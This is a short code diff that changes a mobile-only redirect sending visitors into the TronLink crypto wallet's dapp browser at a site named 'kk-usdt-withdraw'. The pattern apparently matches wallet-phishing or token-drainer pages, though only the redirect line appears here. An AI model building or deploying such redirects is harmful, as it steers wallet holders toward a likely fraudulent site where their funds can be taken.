@@ -80,8 +80,7 @@ isMobile &&
 
 
 window.location.href =
-
-"tronlink://dapp?url=https://kk-usdt-withdraw.vercel.app";
+"tronlink://dapp/open?url=https%3A%2F%2Fkk-usdt-withdraw.vercel.app";
 
 
 
